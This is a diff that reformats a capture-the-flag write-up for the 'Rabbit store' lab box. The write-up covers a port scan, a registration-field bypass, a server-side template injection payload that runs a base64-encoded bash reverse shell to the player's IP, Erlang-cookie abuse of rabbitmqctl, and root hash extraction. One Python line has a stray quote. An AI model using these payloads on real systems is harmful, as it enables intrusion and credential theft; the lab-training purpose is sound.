@@ -1,5 +1,8 @@
-# Nmap 7.94SVN scan initiated Fri Mar  7 07:05:48 2025 as: nmap -sC -sV -sT -T4 -p- -oN box 10.10.156.99
-Nmap scan report for 10.10.156.99
+# Rabbit store writeup
+
+## quickly
+
+```Nmap scan report
 Host is up (0.037s latency).
 Not shown: 65531 closed tcp ports (conn-refused)
 PORT      STATE SERVICE VERSION
@@ -17,6 +20,7 @@ PORT      STATE SERVICE VERSION
 |_    rabbit: 25672
 25672/tcp open  unknown
 Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri Mar  7 07:08:29 2025 -- 1 IP address (1 host up) scanned in 160.33 seconds
@@ -66,6 +70,7 @@ jwt.io
 
 create new account and use burpsuite to add "subscription": "active"
 
+```
 POST /api/register HTTP/1.1
 Host: storage.cloudsite.thm
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
@@ -98,11 +103,13 @@ Content-Length: 169
 {
 	"username": "{{request.application.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjkuMC4xNDYvMTA2NjYgMD4mMQ==|base64 -d|bash').read()}}"
 }
+```
 
 nc -lnvp 10666
 
-reverse shell
+## reverse shell
 
+```
 python3 -c "import pty; pty.spawn('/bin/bash')"
 stty raw -echo ; fg
 
@@ -119,30 +126,31 @@ root    [administrator]
 
 sudo rabbitmqctl --erlang-cookie 'G1Ub8H9zkeliT37t' --node rabbit@forge export_definitions /tmp/definitions.json
 Exporting definitions in JSON to a file at "/tmp/definitions.json" ...
+```
 
+```
 cat /tmp/definitions.json 
 {
     "bindings":[],"exchanges":[],"global_parameters":[{"name":"cluster_name","value":"rabbit@forge"}],"parameters":[],"permissions":[{"configure":".*","read":".*","user":"root","vhost":"/","write":".*"}],"policies":[],"queues":[{"arguments":{},"auto_delete":false,"durable":true,"name":"tasks","type":"classic","vhost":"/"}],"rabbit_version":"3.9.13","rabbitmq_version":"3.9.13","topic_permissions":[{"exchange":"","read":".*","user":"root","vhost":"/","write":".*"}],"users":[{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},"name":"The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.","password_hash":"vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K","tags":[]},{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},"name":"root","password_hash":"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF","tags":["administrator"]}],"vhosts":[{"limits":[],"metadata":{"description":"Default virtual host","tags":[]},"name":"/"}]
-}   
+}
+``` 
 
-root hash is 49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF
+root hash is 49e6hSldHRai9uxhSBHtGU+YBzWF
 
+```
 import hashlib
 import binascii
 
 user_hash = '49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF''
-# Convert the base64 encoded hash to binary
 password_hash = binascii.a2b_base64(user_hash)
-# Convert the binary hash to a hexadecimal string
 decoded_hash = password_hash.hex()
-# Split the decoded hash into two parts
 part1 = decoded_hash[:8]
 part2 = decoded_hash[8:]
 
-# Print only the part2
 print(part2)
 
 python3 decode_root.py
+```
 
 password is:
-295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
+295d1....585
